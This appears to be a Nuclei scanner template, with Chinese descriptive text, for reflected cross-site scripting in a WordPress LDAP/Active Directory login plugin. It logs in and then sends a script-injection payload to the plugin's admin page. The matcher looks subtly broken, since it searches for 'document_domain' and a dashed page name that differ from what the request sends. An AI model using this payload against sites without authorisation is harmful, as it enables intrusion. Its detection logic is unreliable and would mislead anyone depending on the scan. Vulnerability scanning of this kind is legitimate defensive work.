id: ldap-wp-login-xss

info:
  name: Ldap WP Login / Active Directory Integration < 3.0.2 - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: Ldap WP Login / Active Directory Integration < 3.0.2 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Fixed in version 3。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpscan.com/vulnerability/1dc2cec8-e3dd-414b-8ccb-d73d51b051ee
  classification:
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 2
  tags: xss,wp-plugin,wordpress,wp,ldap-wp-login-integration-with-active-directory,wpscan,vuln

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
      - |
        GET /wp-admin/admin.php?page=LDAP+authentication+intergrating+with+AD&a"><script>alert(document.domain)</script> HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(header_2, "text/html")'
          - 'contains_all(body_2, "<script>alert(document_domain)</script>", "LDAP-authentication-intergrating-with-AD")'
        condition: and
